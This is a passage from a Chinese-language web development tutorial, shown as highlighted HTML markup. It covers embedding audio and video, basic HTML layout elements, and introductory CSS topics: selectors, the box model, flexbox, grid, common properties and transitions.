class="hljs-attr">src</span>=<span class="hljs-string">&quot;audio.mp3&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;audio/mpeg&quot;</span>&gt;</span><br>    您的浏览器不支持音频标签。<br><span class="hljs-tag">&lt;/<span class="hljs-name">audio</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>controls</code> 属性为音频播放器添加播放控制按钮。</li></ul><h4 id="嵌入视频"><a href="#嵌入视频" class="headerlink" title="嵌入视频"></a>嵌入视频</h4><p>使用 <code>&lt;video&gt;</code> 标签嵌入视频文件：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">video</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;320&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;240&quot;</span> <span class="hljs-attr">controls</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;video.mp4&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;video/mp4&quot;</span>&gt;</span><br>    您的浏览器不支持视频标签。<br><span class="hljs-tag">&lt;/<span class="hljs-name">video</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>width</code> 和 <code>height</code> 设置视频的显示尺寸。</li></ul><hr><h3 id="HTML-基本布局"><a href="#HTML-基本布局" class="headerlink" title="HTML 基本布局"></a>HTML 基本布局</h3><p>在网页布局中，可以使用 HTML 的块级元素和行内元素</p><p>来设计结构。常用的布局元素包括：</p><ul><li><strong>块级元素</strong>：<code>&lt;div&gt;</code>、<code>&lt;header&gt;</code>、<code>&lt;footer&gt;</code>、<code>&lt;section&gt;</code>、<code>&lt;article&gt;</code> 等，默认独占一行。</li><li><strong>行内元素</strong>：<code>&lt;span&gt;</code>、<code>&lt;a&gt;</code>、<code>&lt;img&gt;</code> 等，默认不会换行。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">header</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>网站标题<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">nav</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span>首页<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> |<br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/about&quot;</span>&gt;</span>关于<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> |<br>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/contact&quot;</span>&gt;</span>联系我们<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">section</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>主要内容区域<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>这里是文章内容。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">section</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">footer</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-symbol">&amp;copy;</span> 2024 网站版权所有<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">footer</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>&lt;header&gt;</code> 用于页面头部。</li><li><code>&lt;nav&gt;</code> 用于导航栏。</li><li><code>&lt;section&gt;</code> 表示页面中的一个内容块。</li><li><code>&lt;footer&gt;</code> 用于页面底部。</li></ul><hr><h3 id="CSS-详尽入门与指南"><a href="#CSS-详尽入门与指南" class="headerlink" title="CSS 详尽入门与指南"></a>CSS 详尽入门与指南</h3><p><strong>CSS（Cascading Style Sheets，层叠样式表）</strong> 是用来描述 HTML 元素如何在屏幕上展示的样式语言。通过使用 CSS，你可以控制网页的布局、颜色、字体、对齐方式、动画等。CSS 是构建美观、现代网页的核心技术之一，结合 HTML 使用，可以创建出复杂且灵活的网页样式</p><hr><h3 id="目录-5"><a href="#目录-5" class="headerlink" title="目录"></a>目录</h3><ol><li><a href="#css-%E5%9F%BA%E7%A1%80">CSS 基础</a><ul><li><a href="#%E5%BC%95%E5%85%A5-css">引入 CSS</a></li><li><a href="#css-%E8%AF%AD%E6%B3%95">CSS 语法</a></li></ul></li><li><a href="#%E9%80%89%E6%8B%A9%E5%99%A8%E8%AF%A6%E8%A7%A3">选择器详解</a><ul><li><a href="#%E9%80%9A%E7%94%A8%E9%80%89%E6%8B%A9%E5%99%A8">通用选择器</a></li><li><a href="#%E5%85%83%E7%B4%A0%E9%80%89%E6%8B%A9%E5%99%A8">元素选择器</a></li><li><a href="#%E7%B1%BB%E9%80%89%E6%8B%A9%E5%99%A8">类选择器</a></li><li><a href="#id-%E9%80%89%E6%8B%A9%E5%99%A8">ID 选择器</a></li><li><a href="#%E5%B1%9E%E6%80%A7%E9%80%89%E6%8B%A9%E5%99%A8">属性选择器</a></li><li><a href="#%E4%BC%AA%E7%B1%BB%E9%80%89%E6%8B%A9%E5%99%A8">伪类选择器</a></li><li><a href="#%E4%BC%AA%E5%85%83%E7%B4%A0%E9%80%89%E6%8B%A9%E5%99%A8">伪元素选择器</a></li></ul></li><li><a href="#css-%E7%9B%92%E6%A8%A1%E5%9E%8B">CSS 盒模型</a><ul><li><a href="#%E7%9B%92%E6%A8%A1%E5%9E%8B%E4%BB%8B%E7%BB%8D">盒模型介绍</a></li><li><a href="#%E8%BE%B9%E8%B7%9Dmargin">边距（Margin）</a></li><li><a href="#%E5%A1%AB%E5%85%85padding">填充（Padding）</a></li><li><a href="#%E8%BE%B9%E6%A1%86border">边框（Border）</a></li><li><a href="#%E5%86%85%E5%AE%B9%E5%8C%BA%E5%9F%9F">内容区域</a></li></ul></li><li><a href="#css-%E5%B8%83%E5%B1%80">CSS 布局</a><ul><li><a href="#%E5%9D%97%E7%BA%A7%E5%85%83%E7%B4%A0%E4%B8%8E%E8%A1%8C%E5%86%85%E5%85%83%E7%B4%A0">块级元素与行内元素</a></li><li><a href="#%E6%B5%AE%E5%8A%A8%E5%B8%83%E5%B1%80float">浮动布局（Float）</a></li><li><a href="#%E5%BC%B9%E6%80%A7%E7%9B%92%E6%A8%A1%E5%9E%8Bflexbox">弹性盒模型（Flexbox）</a></li><li><a href="#%E7%BD%91%E6%A0%BC%E5%B8%83%E5%B1%80grid">网格布局（Grid）</a></li></ul></li><li><a href="#%E5%B8%B8%E8%A7%81-css-%E5%B1%9E%E6%80%A7">常见 CSS 属性</a><ul><li><a href="#%E6%96%87%E6%9C%AC%E6%A0%B7%E5%BC%8F">文本样式</a></li><li><a href="#%E8%83%8C%E6%99%AF%E6%A0%B7%E5%BC%8F">背景样式</a></li><li><a href="#%E6%98%BE%E7%A4%BA%E4%B8%8E%E5%8F%AF%E8%A7%81%E6%80%A7">显示与可见性</a></li></ul></li><li><a href="#css-%E5%8A%A8%E7%94%BB%E4%B8%8E%E8%BF%87%E6%B8%A1">CSS 动画与过渡</a></li><li><a href="#%E5%93%8D%E5%BA%94%E5%BC%8F%E8%AE%BE%E8%AE%A1">响应式设计</a><ul><li><a href="#%E5%AA%92%E4%BD%93%E6%9F%A5%E8%AF%A2">媒体查询</a></li></ul></li><li><a href="#css-%E4%BC%98%E5%8C%96%E6%8A%80%E5%B7%A7">CSS 优化技巧</a></li></ol><hr><h3 id="CSS-基础"><a href="#CSS-基础" class="headerlink" title="CSS 基础"></a>CSS 基础</h3><h4 id="引入-CSS"><a href="#引入-CSS" class="headerlink" title="引入 CSS"></a>引入 CSS</h4><p>在 HTML 中，你可以通过多种方式引入 CSS，最常用的有以下三种方式：</p><ol><li><strong>内联样式</strong>：在 HTML 元素的 <code>style</code> 属性中直接定义样式。</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color: red;&quot;</span>&gt;</span>这是红色的文字<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><ol start="2"><li><strong>内部样式表</strong>：将 CSS 写在 HTML 文件的 <code>&lt;style&gt;</code> 标签内，位于 <code>&lt;head&gt;</code> 部分。</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">        <span class="hljs-selector-tag">p</span> &#123;</span><br><span class="language-css">            <span class="hljs-attribute">color</span>: blue;</span><br><span class="language-css">        &#125;</span><br><span class="language-css">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br></code></pre></td></tr></table></figure><ol start="3"><li><strong>外部样式表</strong>：将 CSS 样式写在独立的 <code>.css</code> 文件中，然后通过 <code>&lt;link&gt;</code> 标签引入。</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;styles.css&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>推荐使用外部样式表</strong>，因为它可以将样式与内容分离，方便管理和维护。</p><hr><h4 id="CSS-语法"><a href="#CSS-语法" class="headerlink" title="CSS 语法"></a>CSS 语法</h4><p>CSS 的基本语法由 <strong>选择器</strong> 和 <strong>声明块</strong> 组成。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">选择器 &#123;<br>    属性: 值;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>例子</strong>：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123;<br>    <span class="hljs-attribute">color</span>: green;<br>    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">16px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><strong>选择器（Selector）</strong>：指定需要应用样式的 HTML 元素。</li><li><strong>属性（Property）</strong>：定义要改变的样式属性，如颜色、字体大小等。</li><li><strong>值（Value）</strong>：为属性提供具体的样式值。</li></ul><hr><h3 id="选择器详解"><a href="#选择器详解" class="headerlink" title="选择器详解"></a>选择器详解</h3><p>CSS 提供了多种选择器，用于选择 HTML 文档中的元素。通过选择器，你可以精确控制哪些元素应用特定的样式。</p><h4 id="通用选择器"><a href="#通用选择器" class="headerlink" title="通用选择器"></a>通用选择器</h4><p>通用选择器 <code>*</code> 用于选择所有元素。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css">* &#123;<br>    <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="元素选择器"><a href="#元素选择器" class="headerlink" title="元素选择器"></a>元素选择器</h4><p>元素选择器直接选择 HTML 标签中的元素。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123;<br>    <span class="hljs-attribute">color</span>: black;<br>&#125;<br></code></pre></td></tr></table></figure><p>以上代码将所有 <code>&lt;p&gt;</code> 元素的文本颜色设为黑色。</p><h4 id="类选择器"><a href="#类选择器" class="headerlink" title="类选择器"></a>类选择器</h4><p>类选择器通过元素的 <code>class</code> 属性来选择特定的元素，使用 <code>.</code> 符号。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.myclass</span> &#123;<br>    <span class="hljs-attribute">color</span>: blue;<br>    <span class="hljs-attribute">font-weight</span>: bold;<br>&#125;<br></code></pre></td></tr></table></figure><p>HTML：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;myclass&quot;</span>&gt;</span>这是一个带类名的段落<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="ID-选择器"><a href="#ID-选择器" class="headerlink" title="ID 选择器"></a>ID 选择器</h4><p>ID 选择器通过元素的 <code>id</code> 属性选择，使用 <code>#</code> 符号。ID 选择器的优先级比类选择器高，但在页面中每个 ID 只能使用一次。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-id">#header</span> &#123;<br>    <span class="hljs-attribute">background-color</span>: lightgrey;<br>&#125;<br></code></pre></td></tr></table></figure><p>HTML：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;header&quot;</span>&gt;</span>这是一个头部区域<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="属性选择器"><a href="#属性选择器" class="headerlink" title="属性选择器"></a>属性选择器</h4><p>属性选择器根据 HTML 元素的属性值进行选择。语法如下：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[type=<span class="hljs-string">&quot;text&quot;</span>]</span> &#123;<br>    <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#000</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>该选择器会为所有 <code>type=&quot;text&quot;</code> 的 <code>input</code> 元素应用样式。</p><h4 id="伪类选择器"><a href="#伪类选择器" class="headerlink" title="伪类选择器"></a>伪类选择器</h4><p>伪类选择器用于选择元素的特定状态，例如当元素被悬停、点击或聚焦时。</p><ul><li>**<code>:hover</code>**：鼠标悬停时应用样式。</li><li>**<code>:focus</code>**：元素获得焦点时应用样式。</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span> &#123;<br>    <span class="hljs-attribute">color</span>: red;<br>&#125;<br><br><span class="hljs-selector-tag">input</span><span class="hljs-selector-pseudo">:focus</span> &#123;<br>    <span class="hljs-attribute">border-color</span>: blue;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="伪元素选择器"><a href="#伪元素选择器" class="headerlink" title="伪元素选择器"></a>伪元素选择器</h4><p>伪元素选择器用于选择元素的一部分，例如文本的第一个字母或行。</p><ul><li>**<code>::before</code>**：在元素内容之前插入内容。</li><li>**<code>::after</code>**：在元素内容之后插入内容。</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">h1</span><span class="hljs-selector-pseudo">::before</span> &#123;<br>    <span class="hljs-attribute">content</span>: <span class="hljs-string">&quot;🌟 &quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>该代码会在所有 <code>&lt;h1&gt;</code> 元素前插入一个星星符号。</p><hr><h3 id="CSS-盒模型"><a href="#CSS-盒模型" class="headerlink" title="CSS 盒模型"></a>CSS 盒模型</h3><h4 id="盒模型介绍"><a href="#盒模型介绍" class="headerlink" title="盒模型介绍"></a>盒模型介绍</h4><p>CSS 中的每个元素都可以被看作一个盒子，CSS 盒模型描述了盒子的组成部分。盒模型包含以下四个部分：</p><ol><li><strong>内容（Content）</strong>：显示文本或图像的实际区域。</li><li><strong>填充（Padding）</strong>：内容周围的空白区域。</li><li><strong>边框（Border）</strong>：环绕填充和内容的边界。</li><li><strong>边距（Margin）</strong>：元素与其他元素之间的距离。</li></ol><p>盒模型图解：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">+----------------------+</span><br><span class="hljs-section">|      Margin           |</span><br><span class="hljs-section">+----------------------+</span><br><span class="hljs-section">|      Border           |</span><br><span class="hljs-section">+----------------------+</span><br><span class="hljs-section">|      Padding          |</span><br><span class="hljs-section">+----------------------+</span><br><span class="hljs-section">|      Content          |</span><br><span class="hljs-section">+----------------------+</span><br></code></pre></td></tr></table></figure><h4 id="边距（Margin）"><a href="#边距（Margin）" class="headerlink" title="边距（Margin）"></a>边距（Margin）</h4><p><code>margin</code> 用于设置元素与其他元素之间的外部间距。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123;<br>    <span class="hljs-attribute">margin</span>: <span class="hljs-number">20px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>你还可以分别为上下左右边距设置不同的值：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123;<br>    <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">10px</span>;<br>    <span class="hljs-attribute">margin-right</span>: <span class="hljs-number">15px</span>;<br>    <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">20px</span>;<br>    <span class="hljs-attribute">margin-left</span>: <span class="hljs-number">25px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="填充（Padding）"><a href="#填充（Padding）" class="headerlink" title="填充（Padding）"></a>填充（Padding）</h4><p><code>padding</code> 用于设置内容与边框之间的内部填充空间。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span> &#123;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>同样可以分别设置四个方向的填充：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span> &#123;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span> <span class="hljs-number">15px</span> <span class="hljs-number">20px</span> <span class="hljs-number">25px</span>;  <span class="hljs-comment">/* 上，右，下，左 */</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="边框（Border）"><a href="#边框（Border）" class="headerlink" title="边框（Border）"></a>边框（Border）</h4><p><code>border</code> 用于设置元素的边框。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span> &#123;<br>    <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid black;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>边框的厚度、样式和颜色可以通过 <code>border-width</code>, <code>border-style</code>, <code>border-color</code> 进行单独设置。</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span> &#123;<br>    <span class="hljs-attribute">border-width</span>: <span class="hljs-number">2px</span>;<br>    <span class="hljs-attribute">border-style</span>: dashed;<br>    <span class="hljs-attribute">border-color</span>: red;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="CSS-布局"><a href="#CSS-布局" class="headerlink" title="CSS 布局"></a>CSS 布局</h3><h4 id="块级元素与行内元素"><a href="#块级元素与行内元素" class="headerlink" title="块级元素与行内元素"></a>块级元素与行内元素</h4><ul><li><strong>块级元素</strong>（如 <code>&lt;div&gt;</code>, <code>&lt;p&gt;</code>）：占据一整行，多个块级元素会自动换行。</li><li><strong>行内元素</strong>（如 <code>&lt;span&gt;</code>, <code>&lt;a&gt;</code>）：只占据内容的宽度，多个行内元素会排在一行中。</li></ul><h4 id="浮动布局（Float）"><a href="#浮动布局（Float）" class="headerlink" title="浮动布局（Float）"></a>浮动布局（Float）</h4><p><code>float</code> 属性用于让元素左右浮动，从而实现简单的布局。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span> &#123;<br>    <span class="hljs-attribute">float</span>: left;<br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>;<br>    <span class="hljs-attribute">margin</span>: <span class="hljs-number">10px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>多个浮动元素可以左右排列，浮动布局常用于图片排版和简单的列布局。</p><h4 id="弹性盒模型（Flexbox）"><a href="#弹性盒模型（Flexbox）" class="headerlink" title="弹性盒模型（Flexbox）"></a>弹性盒模型（Flexbox）</h4><p>&#96;flexbox</p><p>&#96; 是现代布局的强大工具，用于创建灵活的响应式布局。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.container</span> &#123;<br>    <span class="hljs-attribute">display</span>: flex;<br>    <span class="hljs-attribute">justify-content</span>: space-between; <span class="hljs-comment">/* 主轴对齐方式 */</span><br>    <span class="hljs-attribute">align-items</span>: center;  <span class="hljs-comment">/* 交叉轴对齐方式 */</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>display: flex</code> 将容器设为弹性盒容器。</li><li><code>justify-content</code> 和 <code>align-items</code> 控制子元素在主轴和交叉轴上的对齐方式。</li></ul><h4 id="网格布局（Grid）"><a href="#网格布局（Grid）" class="headerlink" title="网格布局（Grid）"></a>网格布局（Grid）</h4><p><code>grid</code> 是另一个用于复杂布局的 CSS 工具，允许你创建二维的网格布局。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.container</span> &#123;<br>    <span class="hljs-attribute">display</span>: grid;<br>    <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr;  <span class="hljs-comment">/* 创建三列等宽布局 */</span><br>    <span class="hljs-attribute">gap</span>: <span class="hljs-number">10px</span>;  <span class="hljs-comment">/* 设置网格间距 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>grid-template-columns</code> 定义列的布局，<code>gap</code> 定义网格项之间的间距。</p><hr><h3 id="常见-CSS-属性"><a href="#常见-CSS-属性" class="headerlink" title="常见 CSS 属性"></a>常见 CSS 属性</h3><h4 id="文本样式"><a href="#文本样式" class="headerlink" title="文本样式"></a>文本样式</h4><ul><li>**<code>color</code>**：设置文本颜色。</li><li>**<code>font-size</code>**：设置字体大小。</li><li>**<code>font-family</code>**：设置字体。</li><li>**<code>text-align</code>**：设置文本对齐方式。</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123;<br>    <span class="hljs-attribute">color</span>: blue;<br>    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">16px</span>;<br>    <span class="hljs-attribute">font-family</span>: Arial, sans-serif;<br>    <span class="hljs-attribute">text-align</span>: center;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="背景样式"><a href="#背景样式" class="headerlink" title="背景样式"></a>背景样式</h4><ul><li>**<code>background-color</code>**：设置元素的背景颜色。</li><li>**<code>background-image</code>**：设置背景图片。</li><li>**<code>background-position</code>**：设置背景图片的位置。</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">body</span> &#123;<br>    <span class="hljs-attribute">background-color</span>: lightgrey;<br>    <span class="hljs-attribute">background-image</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">&#x27;background.jpg&#x27;</span>);<br>    <span class="hljs-attribute">background-position</span>: center;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="显示与可见性"><a href="#显示与可见性" class="headerlink" title="显示与可见性"></a>显示与可见性</h4><ul><li>**<code>display</code>**：控制元素的显示方式。<ul><li><code>display: block</code>：设置元素为块级元素。</li><li><code>display: inline</code>：设置元素为行内元素。</li><li><code>display: none</code>：隐藏元素，不占据空间。</li></ul></li><li>**<code>visibility</code>**：设置元素的可见性。<ul><li><code>visibility: hidden</code>：隐藏元素，但保留空间。</li></ul></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span> &#123;<br>    <span class="hljs-attribute">display</span>: none;<br>&#125;<br><br><span class="hljs-selector-tag">p</span> &#123;<br>    <span class="hljs-attribute">visibility</span>: hidden;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="CSS-动画与过渡"><a href="#CSS-动画与过渡" class="headerlink" title="CSS 动画与过渡"></a>CSS 动画与过渡</h3><p>CSS 提供了简单的方式来创建动画效果和过渡效果。</p><ul><li><strong>过渡</strong>（Transition）：元素属性在一段时间内平滑变化。</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">button</span> &#123;<br>    <span class="hljs-attribute">background-color</span>: blue;<br>    <span class="hljs-attribute">transition</span>: background-color <span class="hljs-number">0.5s</span>;  <span class="hljs-comment">/* 过渡时间 0.5 秒 */</span><br>&#125;<br><br><span class="hljs-selector-tag">button</span><span 